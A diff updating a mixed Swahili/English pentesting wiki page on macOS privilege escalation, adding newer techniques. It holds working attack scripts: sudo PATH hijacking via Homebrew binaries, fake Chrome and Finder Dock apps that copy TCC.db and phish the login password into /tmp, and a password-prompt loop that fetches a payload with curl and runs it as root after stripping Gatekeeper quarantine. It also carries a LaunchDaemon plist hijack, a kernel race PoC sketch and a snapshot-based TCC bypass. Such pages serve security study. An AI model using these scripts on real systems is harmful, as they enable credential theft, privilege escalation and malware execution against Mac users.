@@ -4,7 +4,7 @@
 
 ## TCC Privilege Escalation
 
-If you came here looking for TCC privilege escalation go to:
+Ikiwa umefika hapa ukitafuta TCC privilege escalation, nenda kwa:
 
 
 {{#ref}}
@@ -13,7 +13,7 @@ macos-security-protections/macos-tcc/
 
 ## Linux Privesc
 
-Tafadhali kumbuka kwamba **mikakati mingi kuhusu privilege escalation zinazowagusa Linux/Unix pia zitaathiri mashine za MacOS**. Kwa hivyo angalia:
+Tafadhali kumbuka kwamba **most of the tricks about privilege escalation affecting Linux/Unix will affect also MacOS** mashine. Kwa hivyo angalia:
 
 
 {{#ref}}
@@ -26,32 +26,35 @@ Tafadhali kumbuka kwamba **mikakati mingi kuhusu privilege escalation zinazowagu
 
 You can find the original [Sudo Hijacking technique inside the Linux Privilege Escalation post](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking).
 
-Hata hivyo, macOS **inahifadhi** **`PATH`** ya mtumiaji anapotekeleza **`sudo`**. Hii inamaanisha kwamba njia nyingine ya kufanikisha shambulio hili ni **kuchukua udhibiti wa binaries nyingine** ambazo mwathiriwa bado atazitumia anapotekeleza **`sudo`**:
+However, macOS **maintains** the user's **`PATH`** when he executes **`sudo`**. Which means that another way to achieve this attack would be to **hijack other binaries** that the victim will execute when **running sudo:**
 ```bash
 # Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
-cat > /opt/homebrew/bin/ls <<EOF
+cat > /opt/homebrew/bin/ls <<'EOF'
 #!/bin/bash
-if [ "\$(id -u)" -eq 0 ]; then
+if [ "$(id -u)" -eq 0 ]; then
 whoami > /tmp/privesc
 fi
-/bin/ls "\$@"
+/bin/ls "$@"
 EOF
 chmod +x /opt/homebrew/bin/ls
 
 # victim
 sudo ls
 ```
-Kumbuka kwamba mtumiaji anayeitumia terminali ana uwezekano mkubwa kuwa na **Homebrew installed**. Kwa hivyo inawezekana kuiba binaries katika **`/opt/homebrew/bin`**.
+Kumbuka kwamba mtumiaji anayevumia terminali ana uwezekano mkubwa wa kuwa na **Homebrew imewekwa**. Hivyo inawezekana ku-hijack binaries katika **`/opt/homebrew/bin`**.
 
 ### Dock Impersonation
 
-Kwa kutumia **social engineering** unaweza **kuigiza, kwa mfano, Google Chrome** ndani ya dock na kwa kweli utekeleze script yako mwenyewe:
+Kwa kutumia **social engineering** unaweza **impersonate, kwa mfano, Google Chrome** ndani ya Dock na kwa kweli execute script yako mwenyewe:
 
 {{#tabs}}
 {{#tab name="Chrome Impersonation"}}
-Mapendekezo kadhaa:
+Mapendekezo:
 
-- Angalia katika Dock kama kuna Chrome, na katika kesi hiyo **ondoa** ile entry na **ongeza** **entry bandia ya Chrome katika nafasi ile ile** katika Dock array.
+- Angalia katika Dock kama kuna Chrome, na katika hali hiyo **remove** ile entry na **add** **fake** **Chrome entry in the same position** katika Dock array.
+
+<details>
+<summary>Chrome Dock impersonation script</summary>
 ```bash
 #!/bin/sh
 
@@ -65,7 +68,7 @@ mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
 mkdir -p /tmp/Google\ Chrome.app/Contents/Resources
 
 # Payload to execute
-cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<EOF
+cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
@@ -74,8 +77,8 @@ int main() {
 char *cmd = "open /Applications/Google\\\\ Chrome.app & "
 "sleep 2; "
 "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
-"PASSWORD=\$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
-"echo \$PASSWORD > /tmp/passwd.txt";
+"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
+"echo $PASSWORD > /tmp/passwd.txt";
 system(cmd);
 return 0;
 }
@@ -87,7 +90,7 @@ rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c
 chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
 
 # Info.plist
-cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
+cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
 "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -121,16 +124,21 @@ defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</
 sleep 0.1
 killall Dock
 ```
+</details>
+
 {{#endtab}}
 
 {{#tab name="Finder Impersonation"}}
 Mapendekezo kadhaa:
 
-- Huwezi **kuondoa Finder kutoka kwenye Dock**, kwa hivyo ikiwa utaleta kwenye Dock, unaweza kuweka Finder bandia karibu kabisa na ile halisi. Kwa hili unahitaji **kuongeza kipengee cha Finder bandia mwanzoni mwa Dock array**.
-- Chaguo jingine ni kutoiweka kwenye Dock na kuifungua tu; "Finder asking to control Finder" si jambo la kushangaza sana.
-- Chaguo jingine kwa ajili ya **kupandisha hadi root bila kuuliza** nywila kwa kisanduku kibaya, ni kumfanya Finder kwa kweli aombe nywila ili kufanya kitendo chenye ruhusa:
-- Muombe Finder nakili kwenye **`/etc/pam.d`** faili mpya ya **`sudo`** (Ujumbe unaouliza nywila utaonyesha kwamba "Finder wants to copy sudo")
-- Muombe Finder nakili **Authorization Plugin** mpya (Unaweza kudhibiti jina la faili ili ujumbe unaouliza nywila uonyeshe kwamba "Finder wants to copy Finder.bundle")
+- Huwezi **kuondoa Finder kutoka Dock**, hivyo ikiwa unakusudia kuiweka katika Dock, unaweza kuweka Finder bandia karibu kabisa na ile halisi. Kwa hili unahitaji **kuongeza kipengele cha Finder bandia mwanzoni mwa array ya Dock**.
+- Chaguo jingine ni kutokuiweka katika Dock na kuifungua tu; "Finder asking to control Finder" si jambo la ajabu sana.
+- Njia nyingine za **kupanda hadhi hadi root bila kuuliza** nywila kwa sanduku mbaya, ni kufanya Finder kwa kweli aombe nywila ili kufanya kitendo chenye ruhusa:
+- Ombia Finder kunakili hadi **`/etc/pam.d`** faili mpya ya **`sudo`** (The prompt asking for the password will indicate that "Finder wants to copy sudo")
+- Ombia Finder kunakili **Authorization Plugin** mpya (Unaweza kudhibiti jina la faili ili sehemu inayouliza nywila itaonyesha kwamba "Finder wants to copy Finder.bundle")
+
+<details>
+<summary>Script ya kuiga Finder kwenye Dock</summary>
 ```bash
 #!/bin/sh
 
@@ -144,7 +152,7 @@ mkdir -p /tmp/Finder.app/Contents/MacOS
 mkdir -p /tmp/Finder.app/Contents/Resources
 
 # Payload to execute
-cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<EOF
+cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
@@ -153,8 +161,8 @@ int main() {
 char *cmd = "open /System/Library/CoreServices/Finder.app & "
 "sleep 2; "
 "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
-"PASSWORD=\$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
-"echo \$PASSWORD > /tmp/passwd.txt";
+"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
+"echo $PASSWORD > /tmp/passwd.txt";
 system(cmd);
 return 0;
 }
@@ -166,7 +174,7 @@ rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c
 chmod +x /tmp/Finder.app/Contents/MacOS/Finder
 
 # Info.plist
-cat << EOF > /tmp/Finder.app/Contents/Info.plist
+cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
 "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -200,18 +208,20 @@ defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</
 sleep 0.1
 killall Dock
 ```
+</details>
+
 {{#endtab}}
 {{#endtabs}}
 
 ### Password prompt phishing + sudo reuse
 
-Malware mara nyingi hutumia mwingiliano wa mtumiaji ili **capture a sudo-capable password** na kuitumia tena kwa programu. Mtiririko wa kawaida:
+Malware mara nyingi hutumia mwingiliano wa mtumiaji ili **kunasa nenosiri linaloweza kutumika na sudo** na kulitumia tena kwa njia ya programu. Mtiririko wa kawaida:
 
-1. Tambua mtumiaji aliyeingia kwa kutumia `whoami`.
-2. **Loop password prompts** mpaka `dscl . -authonly "$user" "$pw"` irudishe mafanikio.
-3. Hifadhi kredenshali (mfano, `/tmp/.pass`) na fanya vitendo vyenye mamlaka kwa kutumia `sudo -S` (password over stdin).
+1. Tambua mtumiaji aliyeko kwenye mfumo kwa kutumia `whoami`.
+2. **Rudia kuonyesha maombi ya nenosiri** hadi `dscl . -authonly "$user" "$pw"` irudishe mafanikio.
+3. Hifadhi cheti/kibali (kwa mfano, `/tmp/.pass`) na endesha vitendo vinavyohitaji ruhusa za juu kwa kutumia `sudo -S` (nenosiri kupitia stdin).
 
-Mfano wa mnyororo mdogo:
+Mfano wa mnyororo mfupi:
 ```bash
 user=$(whoami)
 while true; do
@@ -222,14 +232,77 @@ printf '%s\n' "$pw" > /tmp/.pass
 curl -o /tmp/update https://example.com/update
 printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
 ```
-Neno la siri lililodukuliwa linaweza kisha kutumika tena ku**ondoa karantini ya Gatekeeper kwa `xattr -c`**, kunakili LaunchDaemons au faili nyingine zenye vigezo vya juu, na kuendesha hatua zinazofuata bila mwingiliano.
+Neno la siri lililoibwa linaweza kisha kutumika tena kwa **kuondoa karantini ya Gatekeeper kwa `xattr -c`**, kunakili LaunchDaemons au faili nyingine zenye ruhusa za juu, na kuendesha hatua za ziada bila mwingiliano.
+
+## Njia mpya maalum za macOS (2023–2025)
+
+### `AuthorizationExecuteWithPrivileges` iliyopitwa na matumizi bado inatumika
+
+`AuthorizationExecuteWithPrivileges` ilifutwa matumizi katika 10.7 lakini **bado inafanya kazi kwenye Sonoma/Sequoia**. Waundaji wengi wa updaters wa kibiashara huita `/usr/libexec/security_authtrampoline` wakitumia njia isiyo ya kuaminika. Ikiwa binary lengwa ni user-writable unaweza kupandisha trojan na kuendesha prompt halali:
+```bash
+# find vulnerable helper calls
+log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'
+
+# replace expected helper
+cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
+chmod +x /Users/me/Library/Application\ Support/Target/helper
+# when the app updates, the root prompt spawns your payload
+```
+Yunganisha na **masquerading tricks above** ili kuonyesha dirisha la nenosiri linaloonekana halali.
+
+### LaunchDaemon plist hijack (CVE-2025-24085 pattern)
+
+Ikiwa LaunchDaemon plist au lengo lake la `ProgramArguments` ni **user-writable**, unaweza escalate kwa kubadilisha faili hiyo kisha kulazimisha launchd kupakia upya:
+```bash
+sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
+cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
+chmod 755 /Library/PrivilegedHelperTools/securemonitor
+cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0"><dict>
+<key>Label</key><string>com.apple.securemonitor</string>
+<key>ProgramArguments</key>
+<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
+<key>RunAtLoad</key><true/>
+</dict></plist>
+PLIST
+sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
+```
+Hii inaakisi mtindo wa exploit uliotangazwa kwa **CVE-2025-24085**, ambapo writable plist ilitumiwa vibaya kutekeleza attacker code kama root.
+
+### XNU SMR credential race (CVE-2025-24118)
+
+A **race in `kauth_cred_proc_update`** inampa attacker wa ndani uwezo wa kuharibu read-only credential pointer (`proc_ro.p_ucred`) kwa kukimbizana kwa `setgid()`/`getgid()` loops kati ya threads hadi `memcpy` iliyovunjika itokee. Uharibifu uliofanikiwa hutoa **uid 0** na ufikiaji wa kernel memory. Muundo wa minimal PoC:
+```c
+// thread A
+while (1) setgid(rand());
+// thread B
+while (1) getgid();
+```
+Couple with heap grooming to land controlled data where the pointer re-reads. On vulnerable builds this is a reliable **local kernel privesc** without SIP bypass requirements.
+
+### SIP bypass via Migration assistant ("Migraine", CVE-2023-32369)
+
+Ikiwa tayari una root, SIP bado inalizuia uandishi kwa maeneo ya mfumo. Hitilafu **Migraine** inatumia entitlement ya Migration Assistant `com.apple.rootless.install.heritable` kuanzisha child process inayopokea urithi wa SIP bypass na kuandika juu ya protected paths (mfano, `/System/Library/LaunchDaemons`). Mfuatano:
+
+1. Pata root kwenye mfumo unaoendesha.
+2. Chochea `systemmigrationd` kwa crafted state ili kuendesha binary inayodhibitiwa na mshambuliaji.
+3. Tumia entitlement iliyorithiwa kurekebisha faili zilizo protected na SIP, zikidumu hata baada ya reboot.
+
+### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)
+
+Daemons kadhaa za Apple zinakubali **NSPredicate** objects kupitia XPC na zinathibitisha tu field ya `expressionType`, ambayo iko chini ya udhibiti wa mshambuliaji. Kwa kutengeneza predicate inayotathmini selectors yoyote unaweza kupata **code execution in root/system XPC services** (mfano, `coreduetd`, `contextstored`). Ikitumika pamoja na initial app sandbox escape, hii inatoa **privilege escalation without user prompts**. Tafuta XPC endpoints zinazodeserialize predicates na ambazo hazina visitor thabiti.
 
 ## TCC - Root Privilege Escalation
 
 ### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation
 
-**Mtumiaji yeyote** (hata wale wasio na vibali) anaweza kuunda na mount Time Machine snapshot na **kupata FAILI ZOTE** za snapshot hiyo.\
-**Vibali pekee** vinavyohitajika ni kwa programu inayotumika (kama `Terminal`) kuwa na **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`) ambavyo vinapaswa kupewa na admin.
+**Any user** (hata wale wasiokuwa na ruhusa) anaweza kuunda na mount Time Machine snapshot na **access ALL the files** za snapshot hiyo.  
+Ruhusa pekee inayohitajika ni kwamba programu inayotumika (kama `Terminal`) iwe na **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`) ambayo inapaswa kutolewa na admin.
+
+<details>
+<summary>Mount Time Machine snapshot</summary>
 ```bash
 # Create snapshot
 tmutil localsnapshot
@@ -249,12 +322,13 @@ mkdir /tmp/snap
 # Access it
 ls /tmp/snap/Users/admin_user # This will work
 ```
-Maelezo ya kina yanaweza kupatikana [**found in the original report**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**
+</details>
+
+Ufafanuzi wa kina unaweza [**kupatikana katika ripoti ya awali**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**
 
 ## Taarifa Nyeti
 
-Hii inaweza kusaidia kupandisha ruhusa:
-
+Hii inaweza kusaidia kuinua vibali:
 
 {{#ref}}
 macos-files-folders-and-binaries/macos-sensitive-locations.md
@@ -262,6 +336,7 @@ macos-files-folders-and-binaries/macos-sensitive-locations.md
 
 ## Marejeo
 
-- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
+- [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
+- [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)
 
 {{#include ../../banners/hacktricks-training.md}}
